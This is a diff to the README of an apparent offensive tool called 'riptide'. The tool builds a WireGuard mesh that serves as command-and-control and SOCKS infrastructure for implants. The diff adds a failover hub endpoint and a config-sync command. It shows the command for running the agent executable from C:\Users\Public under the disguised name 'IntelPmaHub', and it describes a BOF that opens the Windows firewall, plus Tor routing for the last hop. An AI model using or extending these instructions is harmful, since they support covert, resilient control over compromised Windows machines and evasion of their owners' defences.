@@ -172,13 +172,14 @@ Handshake stale (>90s) → next host:port on the same pubkey. Put DNS and raw IP
 
 ```bash
 python3 mesh.py hub --out ./riptide-out --name harry-hub --os windows \
-  --listen 51820 --endpoints 192.168.0.135:51820
+  --listen 51820 --endpoints 192.168.0.135:51820,203.0.113.10:51820
 python3 mesh.py pack --out ./riptide-out --name harry-hub
+python3 mesh.py sync --out ./riptide-out --remote rt-vps --yes   # wg syncconf, no bounce
 # upload exe + peer.conf, then in implant:
 riptide-hub C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPmaHub
 ```
 
-That host cryptokey-relays overlay peers and is a C2/SOCKS node. Inbound **UDP ListenPort** must reach it. If the VPS handshake dies, the agent promotes an extra hub (`Failover=`) to `10.66.0.0/24`.
+That host cryptokey-relays overlay peers and is a C2/SOCKS node. BOF opens Windows firewall UDP `ListenPort`. Extra hub addresses rotate the same way (`[Riptide] Hubs.<overlay>=`). If the VPS handshake dies, the agent promotes an extra hub (`Failover=`) to `10.66.0.0/24`. Re-pack other spokes so they get the extra `[Peer]`. Do not copy the VPS hub private key onto a host.
 
 Tor last-hop: Tor daemon on that host (`127.0.0.1:9050`), then:
 
